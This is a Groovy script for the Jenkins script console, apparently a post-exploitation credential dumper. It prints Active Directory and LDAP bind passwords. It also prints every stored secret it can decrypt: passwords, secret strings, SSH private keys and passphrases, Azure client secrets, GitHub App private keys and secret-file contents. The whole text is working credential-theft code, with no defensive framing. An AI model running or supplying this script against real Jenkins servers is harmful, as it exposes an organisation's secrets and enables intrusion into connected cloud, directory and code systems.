import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.plugins.credentials.domains.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
import org.jenkinsci.plugins.plaincredentials.impl.*

try {
    for(domain in Jenkins.getInstance().getSecurityRealm().getDomains()) {
        a = domain.getServers() + " " + domain.getBindName() + ":" + domain.getBindPassword()
        println "Domain Bind Credentials: " + a
        println '-------------------------------------------------------------------'
}} catch(Exception){}

try {
    for (conf in Jenkins.getInstance().getSecurityRealm().getConfigurations()) {
    a = conf.getLDAPURL() + " " + conf.getManagerDN() + ":" + conf.getManagerPassword()
    println "LDAP Bind Credentials: " + a
    println '-------------------------------------------------------------------'
}} catch(Exception){}

domain = Domain.global()
store = SystemCredentialsProvider.getInstance().getStore()

for (credential in store.getCredentials(domain)) {
    if (credential instanceof UsernamePasswordCredentialsImpl) {
        println credential.getId() + " " + credential.getUsername() + ":" + credential.getPassword().getPlainText()
        println '-------------------------------------------------------------------'
    } else if (credential instanceof StringCredentialsImpl) {
        println credential.getId() + " " + credential.getSecret().getPlainText() 
        println '-------------------------------------------------------------------'
    } else if(credential instanceof BasicSSHUserPrivateKey) {
        println credential.getId() + " " + credential.getUsername() + ":" + credential.getPassphrase() + "\n" + credential.getPrivateKey()
        println '-------------------------------------------------------------------'
    } else if (credential.getClass().toString() == "class com.microsoft.azure.util.AzureCredentials") {
        println "AzureCred:" + credential.getSubscriptionId() + " " + credential.getClientId() + ":" + credential.getPlainClientSecret() + " " + credential.getTenant()
        println '-------------------------------------------------------------------'
    } else if (credential.getClass().toString() == "class org.jenkinsci.plugins.github_branch_source.GitHubAppCredentials") {
        println credential.getId() + " " + credential.getUsername() + "\n" + credential.getPrivateKey().getPlainText()
        println '-------------------------------------------------------------------'
    }
    else  if (credential.getClass().toString() == "class org.jenkinsci.plugins.plaincredentials.impl.FileCredentialsImpl") {
        println "Secret File: " + credential.getFileName()
        println credential.getContent().text
        println '-------------------------------------------------------------------'
    }
}